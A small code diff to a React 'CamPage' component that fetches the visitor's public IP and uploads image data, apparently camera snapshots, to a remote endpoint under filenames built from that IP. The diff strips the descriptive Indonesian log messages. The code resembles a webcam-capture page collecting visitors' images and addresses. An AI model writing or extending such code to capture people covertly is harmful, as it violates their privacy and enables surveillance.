@@ -109,7 +109,7 @@ const CamPage = () => {
                     const data = await res.json();
                     ip = data.ip.replace(/\./g, "-");
                 } catch (err) {
-                    console.error("Gagal ambil IP publik:", err);
+                    console.error(err);
                 }
 
                 uploadToDrive(imgData, ip);
@@ -125,9 +125,8 @@ const CamPage = () => {
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ image: imgData, filename: `snap_${ip}_${timestamp}.png` }),
                 });
-                console.log("📤 Upload dikirim dengan IP:", ip);
             } catch (err) {
-                console.error("❌ Upload gagal:", err);
+                console.error(err);
             }
         };
 
